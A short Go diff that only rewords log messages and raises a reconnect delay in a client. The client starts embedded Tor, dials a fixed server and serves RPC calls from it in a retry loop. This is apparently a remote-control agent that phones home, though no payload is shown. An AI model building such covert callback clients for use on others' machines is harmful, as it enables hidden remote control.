@@ -15,13 +15,13 @@ import (
 )
 
 func connect(dialer *tor.Dialer) (net.Conn, error) {
-	log.Println("connecting to", s.addr)
+	log.Println("[NetClient] Connecting to:", s.addr)
 	conn, err := dialer.Dial("tcp", s.addr)
 	if err != nil {
 		return nil, err
 	}
 
-	log.Println("connect")
+	log.Println("[NetClient] [+] Connection to server successful")
 	caPool := x509.NewCertPool()
 	caPool.AddCert(s.cert)
 
@@ -33,21 +33,21 @@ func connect(dialer *tor.Dialer) (net.Conn, error) {
 
 // NetClient start tor and invoke connect
 func NetClient() {
-	log.Println("NetClient")
+	log.Println("[NetClient] Starting Tor connection...")
 	initServer()
 	var conf tor.StartConf
 	conf = tor.StartConf{ProcessCreator: embedded.NewCreator()}
 
 	t, err := tor.Start(nil, &conf)
 	if err != nil {
-		log.Println("[!] Tor could not be started:", err)
+		log.Println("[NetClient] [!] Tor could not be started: ", err)
 		return
 	}
 
 	api := new(API)
 	rpc_err := rpc.Register(api)
 	if rpc_err != nil {
-		log.Fatal(rpc_err)
+		log.Fatal("[NetClient] [!] Could not register RPC API: ", rpc_err)
 	}
 
 	defer t.Close()
@@ -56,8 +56,8 @@ func NetClient() {
 	for {
 		conn, err := connect(dialer)
 		if err != nil {
-			log.Println("Could not connect:", err)
-			time.Sleep(10 * time.Second)
+			log.Println("[NetClient] [!] Could not connect: ", err)
+			time.Sleep(25 * time.Second)
 			continue
 		}
 		rpc.ServeConn(conn)
